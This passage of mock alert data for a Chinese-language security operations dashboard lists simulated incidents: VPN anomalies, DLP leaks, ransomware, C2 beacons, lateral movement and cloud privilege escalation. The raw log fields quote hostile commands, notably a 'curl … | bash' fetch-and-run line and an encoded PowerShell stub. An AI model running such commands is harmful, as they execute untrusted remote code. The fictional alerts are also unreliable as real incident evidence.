  { id: 'ALT017', type: 'vpn_anomaly', title: 'VPN异常 - 已离职员工登录', description: '已离职员工高远在离职后仍成功登录VPN，访问了内部代码仓库。该员工账号应已停用。', riskLevel: 'high', status: 'investigating', source: 'VPN网关', sourceIp: '114.88.23.45', destinationIp: '10.0.0.1', userId: 'U033', userName: '高远', timestamp: '2026-05-08T20:00:00Z', rawLog: 'USER=gaoyuan SRC=114.88.23.45 STATUS=SUCCESS ACCT=ACTIVE(should_be_disabled)', tags: ['VPN异常', '离职员工', '账号未停用'], aiScore: 79, aiSummary: '离职员工账号未及时停用，存在数据泄露风险', aiRecommendation: '立即停用账号，审查访问记录，检查离职流程', relatedAlerts: [], timeline: [{ id: 'TL019', timestamp: '2026-05-08T20:00:00Z', type: 'alert', title: '离职员工VPN登录告警', description: 'VPN网关检测到离职员工登录', source: 'VPN网关' }] },
  { id: 'ALT018', type: 'data_exfiltration', title: '数据外泄 - 异常邮件附件发送', description: '财务部郑丽向个人邮箱发送了包含财务报表的加密附件，违反数据安全策略。', riskLevel: 'medium', status: 'investigating', source: 'DLP', sourceIp: '10.0.1.35', destinationIp: '58.216.33.12', userId: 'U010', userName: '郑丽', timestamp: '2026-05-08T17:30:00Z', rawLog: 'SRC=zhengli@secmind.com DST=zhengli88@163.com ATTACH="Q1报表_加密.zip" SIZE=15MB', tags: ['数据外泄', 'DLP', '财务数据'], aiScore: 68, aiSummary: '用户可能无意违反策略，但也可能是数据窃取行为', aiRecommendation: '联系用户确认，审查近期邮件行为', relatedAlerts: [], timeline: [{ id: 'TL020', timestamp: '2026-05-08T17:30:00Z', type: 'alert', title: 'DLP告警', description: 'DLP检测到财务数据外发', source: 'DLP' }] },
  { id: 'ALT019', type: 'malware', title: '恶意软件 - 勒索病毒检测', description: '运维部工作站检测到勒索病毒WannaCry变种，正在尝试加密网络共享文件。EDR已自动隔离该主机。', riskLevel: 'critical', status: 'escalated', source: 'EDR', sourceIp: '10.0.4.22', destinationIp: '10.0.1.10', userId: 'U021', userName: '吕峰', timestamp: '2026-05-09T05:10:00Z', rawLog: 'HOST=OPS-WS-021 MALWARE=WannaCry_variant ACTION=encrypting_share EDR=isolated', tags: ['恶意软件', '勒索病毒', 'WannaCry'], aiScore: 98, aiSummary: '勒索病毒正在传播，EDR已隔离但需检查其他主机', aiRecommendation: '检查全网是否有其他感染主机，恢复备份', relatedAlerts: [], timeline: [{ id: 'TL021', timestamp: '2026-05-09T05:10:00Z', type: 'alert', title: '勒索病毒告警', description: 'EDR检测到WannaCry变种', source: 'EDR' }] },
  { id: 'ALT020', type: 'c2_communication', title: 'C2通信 - 异常HTTPS外联', description: '检测到运维部工作站与已知C2服务器的HTTPS通信，证书为自签名，通信模式符合Beacon行为。', riskLevel: 'high', status: 'investigating', source: '防火墙', sourceIp: '10.0.4.22', destinationIp: '198.51.100.88', userId: 'U021', userName: '吕峰', timestamp: '2026-05-09T05:05:00Z', rawLog: 'SRC=10.0.4.22 DST=198.51.100.88 PROTO=HTTPS CERT=self_signed BEACON_INTERVAL=60s', tags: ['C2通信', 'HTTPS', 'Beacon'], aiScore: 86, aiSummary: 'C2通信与勒索病毒感染相关，可能为同一攻击', aiRecommendation: '封禁C2服务器，检查是否有数据外泄', relatedAlerts: ['ALT019'], timeline: [{ id: 'TL022', timestamp: '2026-05-09T05:05:00Z', type: 'alert', title: 'C2通信告警', description: '防火墙检测到异常HTTPS外联', source: '防火墙' }] },
  { id: 'ALT021', type: 'privilege_escalation', title: '权限提升 - 异常sudo操作', description: '运维工程师吕峰在非工作时间执行了异常sudo操作，获取root权限后下载并执行了未知脚本。', riskLevel: 'high', status: 'investigating', source: 'SIEM', sourceIp: '10.0.4.22', destinationIp: '10.0.4.22', userId: 'U021', userName: '吕峰', timestamp: '2026-05-09T04:50:00Z', rawLog: 'USER=lvfeng CMD="sudo curl http://x.y.z/setup.sh|bash" TIME=0450', tags: ['权限提升', 'sudo', '恶意脚本'], aiScore: 81, aiSummary: '异常sudo操作下载执行了恶意脚本，导致勒索病毒感染', aiRecommendation: '检查脚本内容，确认影响范围', relatedAlerts: ['ALT019', 'ALT020'], timeline: [{ id: 'TL023', timestamp: '2026-05-09T04:50:00Z', type: 'alert', title: '异常sudo告警', description: 'SIEM检测到异常sudo操作', source: 'SIEM' }] },
  { id: 'ALT022', type: 'phishing', title: '钓鱼邮件 - 伪造HR福利通知', description: '检测到伪造HR部门的钓鱼邮件，诱导员工点击链接填写个人信息。邮件主题为"2026年度体检福利登记"。', riskLevel: 'medium', status: 'resolved', source: '邮件网关', sourceIp: '103.45.67.91', destinationIp: '10.0.1.55', userId: 'U005', userName: '刘洋', timestamp: '2026-05-07T09:00:00Z', rawLog: 'SRC=hr@secm1nd.com DST=liuyang@secmind.com SUBJECT="2026年度体检福利登记"', tags: ['钓鱼攻击', '个人信息', '高仿域名'], aiScore: 72, aiSummary: '钓鱼邮件收集个人信息，与ALT001同一攻击基础设施', aiRecommendation: '已自动隔离，通知员工勿点击类似链接', relatedAlerts: ['ALT001', 'ALT008'], timeline: [{ id: 'TL024', timestamp: '2026-05-07T09:00:00Z', type: 'alert', title: '钓鱼邮件告警', description: '邮件网关检测到HR钓鱼邮件', source: '邮件网关' }] },
  { id: 'ALT023', type: 'lateral_movement', title: '横向移动 - WMI远程执行', description: '检测到从运维部工作站通过WMI远程执行命令到多台服务器，执行内容为PowerShell下载脚本。', riskLevel: 'high', status: 'escalated', source: 'SIEM', sourceIp: '10.0.4.22', destinationIp: '10.0.1.15', userId: 'U021', userName: '吕峰', timestamp: '2026-05-09T05:30:00Z', rawLog: 'SRC=10.0.4.22 DST=10.0.1.15 PROTO=WMI CMD="powershell -enc Base64String" TARGETS=5', tags: ['横向移动', 'WMI', 'PowerShell'], aiScore: 89, aiSummary: 'WMI横向移动为勒索病毒传播行为，已影响5台服务器', aiRecommendation: '隔离所有受影响服务器，阻断WMI通信', relatedAlerts: ['ALT019', 'ALT020', 'ALT021'], timeline: [{ id: 'TL025', timestamp: '2026-05-09T05:30:00Z', type: 'alert', title: '横向移动告警', description: 'SIEM检测到WMI远程执行', source: 'SIEM' }] },
  { id: 'ALT024', type: 'vpn_anomaly', title: 'VPN异常 - 多设备同时在线', description: '用户张伟的VPN账号同时在3台不同设备上在线，且设备分布在不同城市。', riskLevel: 'medium', status: 'resolved', source: 'VPN网关', sourceIp: '10.0.2.50', destinationIp: '10.0.0.1', userId: 'U001', userName: '张伟', timestamp: '2026-05-08T14:00:00Z', rawLog: 'USER=zhangwei SESSIONS=3 DEVICES=Beijing,Shanghai,Shenzhen', tags: ['VPN异常', '多设备', '凭证共享'], aiScore: 55, aiSummary: '可能是用户在多设备间切换，也可能是凭证泄露', aiRecommendation: '联系用户确认，建议启用单设备登录策略', relatedAlerts: [], timeline: [{ id: 'TL026', timestamp: '2026-05-08T14:00:00Z', type: 'alert', title: '多设备VPN告警', description: 'VPN网关检测到多设备同时在线', source: 'VPN网关' }] },
  { id: 'ALT025', type: 'brute_force', title: '暴力破解 - 针对邮件系统', description: '检测到针对Exchange邮件系统的暴力破解攻击，使用IMAP协议尝试登录。', riskLevel: 'medium', status: 'resolved', source: '邮件网关', sourceIp: '185.220.101.36', destinationIp: '10.0.1.55', userId: 'U017', userName: '杨帆', timestamp: '2026-05-07T08:30:00Z', rawLog: 'SRC=185.220.101.36 DST=10.0.1.55 PROTO=IMAP FAIL_COUNT=100', tags: ['暴力破解', 'IMAP', '邮件系统'], aiScore: 62, aiSummary: 'IMAP暴力破解，来源为Tor节点', aiRecommendation: '封禁IP，检查是否有账户被破解', relatedAlerts: ['ALT002', 'ALT009'], timeline: [{ id: 'TL027', timestamp: '2026-05-08T08:30:00Z', type: 'alert', title: 'IMAP暴力破解告警', description: '邮件网关检测到IMAP暴力破解', source: '邮件网关' }] },
  { id: 'ALT026', type: 'data_exfiltration', title: '数据外泄 - 云盘上传敏感文件', description: '检测到研发部员工通过个人云盘上传了项目源代码，触发DLP策略告警。', riskLevel: 'medium', status: 'investigating', source: 'DLP', sourceIp: '10.0.2.88', destinationIp: '52.84.123.45', userId: 'U030', userName: '林峰', timestamp: '2026-05-08T15:20:00Z', rawLog: 'SRC=10.0.2.88 DST=cloud.baidu.com SIZE=500MB TYPE=source_code USER=linfeng', tags: ['数据外泄', '云盘', '源代码'], aiScore: 60, aiSummary: '用户可能为方便工作上传代码，但违反安全策略', aiRecommendation: '联系用户删除云盘文件，加强安全意识培训', relatedAlerts: [], timeline: [{ id: 'TL028', timestamp: '2026-05-08T15:20:00Z', type: 'alert', title: 'DLP告警', description: 'DLP检测到云盘上传敏感文件', source: 'DLP' }] },
  { id: 'ALT027', type: 'malware', title: '恶意软件 - 挖矿木马', description: '检测到运维部服务器CPU使用率异常，经排查发现运行了加密货币挖矿木马。木马通过Docker API未授权访问植入。', riskLevel: 'medium', status: 'resolved', source: 'EDR', sourceIp: '10.0.4.10', destinationIp: '10.0.4.10', userId: 'U014', userName: '蒋华', timestamp: '2026-05-07T22:00:00Z', rawLog: 'HOST=OPS-SVR-010 CPU=98% PROC=xmrig MALWARE=crypto_miner VECTOR=docker_api', tags: ['恶意软件', '挖矿木马', 'Docker'], aiScore: 58, aiSummary: '挖矿木马通过Docker API漏洞植入，未发现数据窃取行为', aiRecommendation: '清除挖矿进程，修复Docker API配置', relatedAlerts: [], timeline: [{ id: 'TL029', timestamp: '2026-05-07T22:00:00Z', type: 'alert', title: '挖矿木马告警', description: 'EDR检测到异常CPU使用', source: 'EDR' }] },
  { id: 'ALT028', type: 'c2_communication', title: 'C2通信 - IRC协议外联', description: '检测到内网主机通过IRC协议与境外服务器通信，IRC频道名包含随机字符串，疑似C2控制通道。', riskLevel: 'medium', status: 'resolved', source: '防火墙', sourceIp: '10.0.3.45', destinationIp: '203.0.113.50', userId: 'U022', userName: '施蕾', timestamp: '2026-05-08T17:00:00Z', rawLog: 'SRC=10.0.3.45 DST=203.0.113.50 PROTO=IRC CHANNEL="#a7f3b2" BOT_CMD=detected', tags: ['C2通信', 'IRC', 'Botnet'], aiScore: 70, aiSummary: 'IRC C2通道与Emotet木马关联，为同一攻击链', aiRecommendation: '封禁IRC服务器，清除Emotet木马', relatedAlerts: ['ALT014'], timeline: [{ id: 'TL030', timestamp: '2026-05-08T17:00:00Z', type: 'alert', title: 'IRC C2告警', description: '防火墙检测到IRC异常外联', source: '防火墙' }] },
  { id: 'ALT029', type: 'privilege_escalation', title: '权限提升 - 数据库异常权限授予', description: 'DBA蒋华在非工作时间向普通账户授予了数据库管理员权限，操作来源IP为内网但非DBA常用终端。', riskLevel: 'high', status: 'investigating', source: 'SIEM', sourceIp: '10.0.4.15', destinationIp: '10.0.1.30', userId: 'U014', userName: '蒋华', timestamp: '2026-05-08T23:00:00Z', rawLog: 'DB=production USER=jianghua ACTION=GRANT ROLE=dba TO=app_service TIME=2300 SRC=10.0.4.15', tags: ['权限提升', '数据库', '异常授权'], aiScore: 76, aiSummary: '非工作时间异常授权，来源IP非DBA常用终端，可能为凭证被盗用', aiRecommendation: '撤销授权，联系DBA确认，检查数据库访问日志', relatedAlerts: [], timeline: [{ id: 'TL031', timestamp: '2026-05-08T23:00:00Z', type: 'alert', title: '异常授权告警', description: 'SIEM检测到数据库异常权限授予', source: 'SIEM' }] },
  { id: 'ALT030', type: 'phishing', title: '钓鱼邮件 - 伪造快递通知', description: '检测到伪造快递公司的钓鱼邮件，诱导用户点击链接查看快递信息，实际为钓鱼页面。', riskLevel: 'low', status: 'false_positive', source: '邮件网关', sourceIp: '58.216.33.15', destinationIp: '10.0.1.55', userId: 'U015', userName: '沈雪', timestamp: '2026-05-07T14:00:00Z', rawLog: 'SRC=noreply@sf-express.com.cn DST=shenxue@secmind.com SUBJECT="您有快递待取"', tags: ['钓鱼攻击'], aiScore: 35, aiSummary: '疑似钓鱼邮件但经人工确认为真实快递通知', aiRecommendation: '标记为误报', relatedAlerts: [], timeline: [{ id: 'TL032', timestamp: '2026-05-07T14:00:00Z', type: 'alert', title: '钓鱼邮件告警', description: '邮件网关检测到疑似钓鱼邮件', source: '邮件网关' }] },
  { id: 'ALT031', type: 'brute_force', title: '暴力破解 - 针对Jenkins', description: '检测到针对Jenkins CI/CD系统的暴力破解攻击，使用默认凭证和常见弱密码。', riskLevel: 'medium', status: 'resolved', source: 'SIEM', sourceIp: '45.33.32.100', destinationIp: '10.0.2.50', userId: 'U017', userName: '杨帆', timestamp: '2026-05-06T16:00:00Z', rawLog: 'SRC=45.33.32.100 DST=10.0.2.50 APP=Jenkins FAIL_COUNT=60', tags: ['暴力破解', 'Jenkins', 'CI/CD'], aiScore: 60, aiSummary: 'Jenkins暴力破解，需检查是否使用了默认凭证', aiRecommendation: '修改默认凭证，启用访问控制', relatedAlerts: [], timeline: [{ id: 'TL033', timestamp: '2026-05-06T16:00:00Z', type: 'alert', title: 'Jenkins暴力破解告警', description: 'SIEM检测到Jenkins暴力破解', source: 'SIEM' }] },
  { id: 'ALT032', type: 'vpn_anomaly', title: 'VPN异常 - 长时间连接', description: '用户冯涛的VPN连接持续超过48小时未断开，且数据传输量异常大，疑似异常。', riskLevel: 'low', status: 'resolved', source: 'VPN网关', sourceIp: '10.0.2.60', destinationIp: '10.0.0.1', userId: 'U011', userName: '冯涛', timestamp: '2026-05-08T08:00:00Z', rawLog: 'USER=fengtao DURATION=52h DATA=15GB', tags: ['VPN异常', '长时间连接'], aiScore: 40, aiSummary: '可能是远程办公忘记断开，数据量在正常范围内', aiRecommendation: '设置VPN超时策略', relatedAlerts: [], timeline: [{ id: 'TL034', timestamp: '2026-05-08T08:00:00Z', type: 'alert', title: 'VPN长时间连接告警', description: 'VPN网关检测到异常长连接', source: 'VPN网关' }] },
  { id: 'ALT033', type: 'lateral_movement', title: '横向移动 - PsExec远程执行', description: '检测到使用PsExec工具在内网主机间远程执行程序，来源为已失陷的人事部工作站。', riskLevel: 'high', status: 'escalated', source: 'EDR', sourceIp: '10.0.3.45', destinationIp: '10.0.1.25', userId: 'U022', userName: '施蕾', timestamp: '2026-05-08T18:00:00Z', rawLog: 'SRC=10.0.3.45 DST=10.0.1.25 TOOL=PsExec PROC=cmd.exe USER=shilei', tags: ['横向移动', 'PsExec', '内网渗透'], aiScore: 84, aiSummary: 'PsExec横向移动与Emotet木马攻击链一致', aiRecommendation: '隔离受影响主机，检查Emotet传播范围', relatedAlerts: ['ALT014', 'ALT028'], timeline: [{ id: 'TL035', timestamp: '2026-05-08T18:00:00Z', type: 'alert', title: 'PsExec横向移动告警', description: 'EDR检测到PsExec远程执行', source: 'EDR' }] },
  { id: 'ALT034', type: 'data_exfiltration', title: '数据外泄 - USB设备拷贝', description: '检测到安全部分析师在非工作时间使用USB设备拷贝了大量安全策略文档。', riskLevel: 'medium', status: 'investigating', source: 'EDR', sourceIp: '10.0.5.10', destinationIp: '10.0.5.10', userId: 'U032', userName: '马骏', timestamp: '2026-05-08T21:30:00Z', rawLog: 'HOST=SOC-WS-032 USB=inserted FILES=150 SIZE=200MB TYPE=security_docs TIME=2130', tags: ['数据外泄', 'USB', '安全文档'], aiScore: 63, aiSummary: 'SOC分析师拷贝安全文档，可能是正常工作也可能是内部威胁', aiRecommendation: '联系用户确认用途，审查USB使用策略', relatedAlerts: [], timeline: [{ id: 'TL036', timestamp: '2026-05-08T21:30:00Z', type: 'alert', title: 'USB拷贝告警', description: 'EDR检测到USB设备拷贝', source: 'EDR' }] },
  { id: 'ALT035', type: 'c2_communication', title: 'C2通信 - Telegram Bot API', description: '检测到内网主机通过Telegram Bot API外传数据，使用合法API接口规避检测。', riskLevel: 'high', status: 'investigating', source: '防火墙', sourceIp: '10.0.2.100', destinationIp: '149.154.167.220', userId: 'U004', userName: '陈刚', timestamp: '2026-05-09T00:30:00Z', rawLog: 'SRC=10.0.2.100 DST=api.telegram.org PROTO=HTTPS BOT_TOKEN=detected DATA=exfil', tags: ['C2通信', 'Telegram', '数据外传'], aiScore: 87, aiSummary: 'APT攻击者使用Telegram Bot作为C2通道，与Cobalt Strike攻击链关联', aiRecommendation: '封禁Telegram API访问，检查数据泄露范围', relatedAlerts: ['ALT004', 'ALT005', 'ALT007'], timeline: [{ id: 'TL037', timestamp: '2026-05-09T00:30:00Z', type: 'alert', title: 'Telegram C2告警', description: '防火墙检测到Telegram Bot API异常通信', source: '防火墙' }] },
  { id: 'ALT036', type: 'phishing', title: '钓鱼邮件 - 伪造电子发票', description: '检测到伪造税务局电子发票的钓鱼邮件，附件为HTML钓鱼页面。', riskLevel: 'medium', status: 'resolved', source: '邮件网关', sourceIp: '198.51.100.45', destinationIp: '10.0.1.55', userId: 'U020', userName: '许佳', timestamp: '2026-05-06T10:00:00Z', rawLog: 'SRC=tax@gov-cn.com DST=xujia@secmind.com ATTACH="电子发票.html"', tags: ['钓鱼攻击', '电子发票', 'HTML钓鱼'], aiScore: 70, aiSummary: 'HTML附件为钓鱼页面，仿造税务局网站', aiRecommendation: '已自动隔离，提醒用户注意', relatedAlerts: [], timeline: [{ id: 'TL038', timestamp: '2026-05-06T10:00:00Z', type: 'alert', title: '钓鱼邮件告警', description: '邮件网关检测到伪造发票钓鱼邮件', source: '邮件网关' }] },
  { id: 'ALT037', type: 'brute_force', title: '暴力破解 - 针对GitLab', description: '检测到针对GitLab代码仓库的暴力破解攻击，使用泄露凭证列表。', riskLevel: 'medium', status: 'resolved', source: 'SIEM', sourceIp: '103.45.67.92', destinationIp: '10.0.2.50', userId: 'U009', userName: '吴强', timestamp: '2026-05-06T20:00:00Z', rawLog: 'SRC=103.45.67.92 DST=10.0.2.50 APP=GitLab FAIL_COUNT=40', tags: ['暴力破解', 'GitLab', '代码仓库'], aiScore: 58, aiSummary: 'GitLab暴力破解，需检查是否有账户被破解', aiRecommendation: '强制密码重置，启用2FA', relatedAlerts: ['ALT016'], timeline: [{ id: 'TL039', timestamp: '2026-05-06T20:00:00Z', type: 'alert', title: 'GitLab暴力破解告警', description: 'SIEM检测到GitLab暴力破解', source: 'SIEM' }] },
  { id: 'ALT038', type: 'malware', title: '恶意软件 - 远控木马RAT', description: '产品部工作站检测到远控木马，攻击者可远程控制桌面、截屏、键盘记录。木马通过U盘传播。', riskLevel: 'high', status: 'investigating', source: 'EDR', sourceIp: '10.0.3.60', destinationIp: '77.88.44.33', userId: 'U034', userName: '罗薇', timestamp: '2026-05-08T11:00:00Z', rawLog: 'HOST=PM-WS-034 MALWARE=NJRat C2=77.88.44.33 VECTOR=USB', tags: ['恶意软件', 'RAT', '远控'], aiScore: 82, aiSummary: 'NJRat远控木马，攻击者可能已获取桌面控制权限', aiRecommendation: '隔离主机，检查是否有数据被窃取', relatedAlerts: [], timeline: [{ id: 'TL040', timestamp: '2026-05-08T11:00:00Z', type: 'alert', title: 'RAT检测告警', description: 'EDR检测到NJRat远控木马', source: 'EDR' }] },
  { id: 'ALT039', type: 'vpn_anomaly', title: 'VPN异常 - 非常规时间登录', description: '用户谢勇在凌晨2点从家中登录VPN，该用户正常工作时间为9-18点，且无加班申请。', riskLevel: 'low', status: 'resolved', source: 'VPN网关', sourceIp: '123.120.88.45', destinationIp: '10.0.0.1', userId: 'U035', userName: '谢勇', timestamp: '2026-05-08T02:00:00Z', rawLog: 'USER=xieyong SRC=123.120.88.45 TIME=0200 PREV_LOGIN=0900', tags: ['VPN异常', '非常规时间'], aiScore: 30, aiSummary: '非常规时间登录但来源为用户家中IP，可能是加班', aiRecommendation: '联系用户确认', relatedAlerts: [], timeline: [{ id: 'TL041', timestamp: '2026-05-08T02:00:00Z', type: 'alert', title: '非常规时间VPN告警', description: 'VPN网关检测到非常规时间登录', source: 'VPN网关' }] },
  { id: 'ALT040', type: 'privilege_escalation', title: '权限提升 - Kubernetes RBAC异常', description: '检测到Kubernetes集群中异常的ClusterRoleBinding操作，将普通ServiceAccount绑定至cluster-admin角色。', riskLevel: 'high', status: 'investigating', source: 'SIEM', sourceIp: '10.0.2.50', destinationIp: '10.0.2.50', userId: 'U017', userName: '杨帆', timestamp: '2026-05-08T19:00:00Z', rawLog: 'K8S_NS=default ACTION=ClusterRoleBinding SUBJECT=sa:default ROLE=cluster-admin', tags: ['权限提升', 'Kubernetes', 'RBAC'], aiScore: 77, aiSummary: 'K8s RBAC异常操作，可能为攻击者获取集群控制权', aiRecommendation: '撤销ClusterRoleBinding，检查集群安全配置', relatedAlerts: [], timeline: [{ id: 'TL042', timestamp: '2026-05-08T19:00:00Z', type: 'alert', title: 'K8s RBAC异常告警', description: 'SIEM检测到异常ClusterRoleBinding', source: 'SIEM' }] },
  { id: 'ALT041', type: 'lateral_movement', title: '横向移动 - SSH密钥滥用', description: '检测到使用未授权SSH密钥从开发环境跳转至生产环境服务器，密钥不属于任何已知管理员。', riskLevel: 'high', status: 'escalated', source: 'SIEM', sourceIp: '10.0.2.100', destinationIp: '10.0.1.15', userId: 'U004', userName: '陈刚', timestamp: '2026-05-09T00:00:00Z', rawLog: 'SRC=10.0.2.100 DST=10.0.1.15 AUTH=ssh_key KEY=unknown USER=root', tags: ['横向移动', 'SSH密钥', '生产环境'], aiScore: 88, aiSummary: '未授权SSH密钥访问生产环境，与APT攻击链关联', aiRecommendation: '撤销未授权密钥，审计所有SSH密钥', relatedAlerts: ['ALT004', 'ALT006'], timeline: [{ id: 'TL043', timestamp: '2026-05-09T00:00:00Z', type: 'alert', title: 'SSH密钥滥用告警', description: 'SIEM检测到未授权SSH密钥访问', source: 'SIEM' }] },
  { id: 'ALT042', type: 'data_exfiltration', title: '数据外泄 - 异常DNS查询', description: '检测到大量异常DNS查询，查询域名长度异常，疑似DNS数据外泄通道。', riskLevel: 'medium', status: 'investigating', source: '防火墙', sourceIp: '10.0.3.60', destinationIp: '8.8.8.8', userId: 'U034', userName: '罗薇', timestamp: '2026-05-08T12:00:00Z', rawLog: 'SRC=10.0.3.60 DST=8.8.8.8 DNS_LEN=250+ QUERY=encoded_data.xfil.xyz COUNT=500+', tags: ['数据外泄', 'DNS', '隐秘通道'], aiScore: 72, aiSummary: 'DNS数据外泄通道，与NJRat远控木马关联', aiRecommendation: '封禁相关域名，清除远控木马', relatedAlerts: ['ALT038'], timeline: [{ id: 'TL044', timestamp: '2026-05-08T12:00:00Z', type: 'alert', title: 'DNS外泄告警', description: '防火墙检测到异常DNS查询', source: '防火墙' }] },
  { id: 'ALT043', type: 'c2_communication', title: 'C2通信 - GitHub作为C2通道', description: '检测到内网主机通过GitHub Issues API进行C2通信，利用合法服务规避检测。', riskLevel: 'high', status: 'investigating', source: '防火墙', sourceIp: '10.0.2.100', destinationIp: '140.82.121.6', userId: 'U004', userName: '陈刚', timestamp: '2026-05-08T23:00:00Z', rawLog: 'SRC=10.0.2.100 DST=api.github.com PROTO=HTTPS REPO=private/issues PATTERN=encoded_cmds', tags: ['C2通信', 'GitHub', 'APT'], aiScore: 85, aiSummary: 'APT攻击者使用GitHub Issues作为C2通道，高度隐蔽', aiRecommendation: '封堵异常GitHub仓库，检查通信内容', relatedAlerts: ['ALT004', 'ALT005'], timeline: [{ id: 'TL045', timestamp: '2026-05-08T23:00:00Z', type: 'alert', title: 'GitHub C2告警', description: '防火墙检测到GitHub Issues C2通信', source: '防火墙' }] },
  { id: 'ALT044', type: 'brute_force', title: '暴力破解 - 针对WordPress', description: '检测到针对公司博客WordPress后台的暴力破解攻击。', riskLevel: 'low', status: 'resolved', source: '防火墙', sourceIp: '45.33.32.101', destinationIp: '10.0.1.60', userId: 'U015', userName: '沈雪', timestamp: '2026-05-06T12:00:00Z', rawLog: 'SRC=45.33.32.101 DST=10.0.1.60 APP=WordPress FAIL_COUNT=30', tags: ['暴力破解', 'WordPress'], aiScore: 25, aiSummary: 'WordPress暴力破解，影响范围有限', aiRecommendation: '封禁IP，加强WordPress安全配置', relatedAlerts: [], timeline: [{ id: 'TL046', timestamp: '2026-05-06T12:00:00Z', type: 'alert', title: 'WordPress暴力破解告警', description: '防火墙检测到WordPress暴力破解', source: '防火墙' }] },
  { id: 'ALT045', type: 'phishing', title: '钓鱼邮件 - 伪造银行通知', description: '检测到伪造银行通知的钓鱼邮件，诱导用户输入银行卡信息。', riskLevel: 'medium', status: 'resolved', source: '邮件网关', sourceIp: '198.51.100.50', destinationIp: '10.0.1.55', userId: 'U031', userName: '何欣', timestamp: '2026-05-06T15:00:00Z', rawLog: 'SRC=service@icbc-secure.com DST=hexin@secmind.com SUBJECT="账户异常通知"', tags: ['钓鱼攻击', '银行钓鱼'], aiScore: 68, aiSummary: '银行钓鱼邮件，与公司安全无关但影响员工个人安全', aiRecommendation: '已自动隔离，提醒员工注意', relatedAlerts: [], timeline: [{ id: 'TL047', timestamp: '2026-05-06T15:00:00Z', type: 'alert', title: '银行钓鱼告警', description: '邮件网关检测到银行钓鱼邮件', source: '邮件网关' }] },
  { id: 'ALT046', type: 'malware', title: '恶意软件 - WebShell检测', description: '检测到Web服务器上的异常WebShell文件，攻击者可能通过文件上传漏洞植入。', riskLevel: 'high', status: 'escalated', source: 'EDR', sourceIp: '10.0.1.60', destinationIp: '10.0.1.60', userId: 'U017', userName: '杨帆', timestamp: '2026-05-07T18:00:00Z', rawLog: 'HOST=WEB-SVR PATH=/uploads/cmd.php TYPE=WebShell SIG=ChinaChopper', tags: ['恶意软件', 'WebShell', 'ChinaChopper'], aiScore: 80, aiSummary: 'ChinaChopper WebShell，攻击者可能已获取服务器控制权', aiRecommendation: '删除WebShell，修复上传漏洞，检查服务器完整性', relatedAlerts: [], timeline: [{ id: 'TL048', timestamp: '2026-05-07T18:00:00Z', type: 'alert', title: 'WebShell告警', description: 'EDR检测到ChinaChopper WebShell', source: 'EDR' }] },
  { id: 'ALT047', type: 'vpn_anomaly', title: 'VPN异常 - 短时间多次断连重连', description: '用户周静的VPN在30分钟内断连重连超过10次，可能是网络问题也可能是攻击行为。', riskLevel: 'low', status: 'resolved', source: 'VPN网关', sourceIp: '10.0.3.70', destinationIp: '10.0.0.1', userId: 'U008', userName: '周静', timestamp: '2026-05-07T16:00:00Z', rawLog: 'USER=zhoujing RECONNECTS=10/30min', tags: ['VPN异常', '频繁断连'], aiScore: 28, aiSummary: '频繁断连可能为网络不稳定导致', aiRecommendation: '联系用户确认网络状况', relatedAlerts: [], timeline: [{ id: 'TL049', timestamp: '2026-05-07T16:00:00Z', type: 'alert', title: 'VPN频繁断连告警', description: 'VPN网关检测到频繁断连重连', source: 'VPN网关' }] },
  { id: 'ALT048', type: 'lateral_movement', title: '横向移动 - RDP横向扩散', description: '检测到从已失陷工作站通过RDP向多台内网主机横向扩散，使用窃取的凭证。', riskLevel: 'critical', status: 'escalated', source: 'SIEM', sourceIp: '10.0.2.100', destinationIp: '10.0.1.35', userId: 'U004', userName: '陈刚', timestamp: '2026-05-09T02:00:00Z', rawLog: 'SRC=10.0.2.100 DST=10.0.1.35 PROTO=RDP AUTH=stolen_creds TARGETS=8', tags: ['横向移动', 'RDP', '凭证窃取'], aiScore: 93, aiSummary: 'RDP横向扩散已影响8台主机，为APT攻击链延续', aiRecommendation: '隔离所有受影响主机，重置凭证', relatedAlerts: ['ALT004', 'ALT006', 'ALT013'], timeline: [{ id: 'TL050', timestamp: '2026-05-09T02:00:00Z', type: 'alert', title: 'RDP横向移动告警', description: 'SIEM检测到RDP横向扩散', source: 'SIEM' }] },
  { id: 'ALT049', type: 'data_exfiltration', title: '数据外泄 - 打印机异常打印', description: '检测到非工作时间大量打印敏感文档，打印机日志显示打印了200+页财务报表。', riskLevel: 'medium', status: 'investigating', source: 'SIEM', sourceIp: '10.0.1.35', destinationIp: '10.0.1.35', userId: 'U010', userName: '郑丽', timestamp: '2026-05-08T22:00:00Z', rawLog: 'PRINTER=3F-Finance PAGES=230 USER=zhengli TIME=2200 DOC=Q1_财务报表', tags: ['数据外泄', '打印', '财务数据'], aiScore: 55, aiSummary: '非工作时间大量打印财务文档，可能是正常工作也可能是数据窃取', aiRecommendation: '联系用户确认，审查打印策略', relatedAlerts: ['ALT018'], timeline: [{ id: 'TL051', timestamp: '2026-05-08T22:00:00Z', type: 'alert', title: '异常打印告警', description: 'SIEM检测到非工作时间大量打印', source: 'SIEM' }] },
  { id: 'ALT050', type: 'privilege_escalation', title: '权限提升 - AWS IAM异常', description: '检测到AWS IAM中异常的权限提升操作，普通用户被添加至Administrator组。', riskLevel: 'high', status: 'investigating', source: 'SIEM', sourceIp: '10.0.2.50', destinationIp: '10.0.2.50', userId: 'U017', userName: '杨帆', timestamp: '2026-05-08T20:00:00Z', rawLog: 'AWS_IAM ACTION=AddUserToGroup USER=app-service GROUP=Administrators SOURCE=10.0.2.50', tags: ['权限提升', 'AWS', 'IAM'], aiScore: 78, aiSummary: 'AWS IAM异常操作，可能为攻击者获取云资源控制权', aiRecommendation: '撤销权限，检查AWS操作日志', relatedAlerts: ['ALT040'], timeline: [{ id: 'TL052', timestamp: '2026-05-08T20:00:00Z', type: 'alert', title: 'AWS IAM异常告警', description: 'SIEM检测到IAM权限提升', source: 'SIEM' }] },
